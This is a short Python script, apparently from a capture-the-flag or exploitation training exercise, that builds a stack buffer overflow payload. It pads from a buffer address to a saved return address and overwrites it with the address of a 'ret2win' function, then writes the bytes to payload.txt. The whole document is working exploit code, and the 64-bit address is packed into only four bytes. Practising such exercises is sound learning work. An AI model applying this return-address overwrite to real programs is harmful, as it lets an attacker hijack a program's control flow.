rip_addr = 0x7fffffffdd78
buf_addr = 0x7fffffffdd50

ret2win_addr = 0x400756

payload = (b"a" * (rip_addr - buf_addr) +
           ret2win_addr.to_bytes(4, "little"))

with open("payload.txt", "wb") as f:
    f.write(payload)
